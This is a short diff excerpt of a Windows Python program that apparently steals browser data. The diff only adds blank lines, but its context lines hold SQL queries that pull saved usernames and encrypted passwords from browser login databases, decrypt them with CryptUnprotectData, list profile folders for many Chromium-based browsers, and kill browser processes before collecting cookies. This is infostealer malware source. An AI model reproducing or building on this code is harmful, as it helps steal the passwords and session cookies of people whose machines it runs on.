@@ -6,6 +6,7 @@ from win32crypt import CryptUnprotectData
 from subprocess import run, DEVNULL
 from tempfile import TemporaryDirectory, NamedTemporaryFile
 from datetime import datetime, timedelta
+
 data_queries = {
     'login_data': {
         'query': 'SELECT action_url, username_value, password_value FROM logins',
@@ -38,6 +39,7 @@ data_queries = {
         'decrypt': True
     }
 }
+
 browsers = {
     'avast': local + '\\AVAST Software\\Browser\\User Data',
     'amigo': local + '\\Amigo\\User Data',
@@ -86,6 +88,7 @@ browsers_to_kill = [
     'coccoc.exe',
     'opera_gx.exe'
 ]
+
 def browser_cookies():
     def kill_browsers():
         for browser in browsers_to_kill:
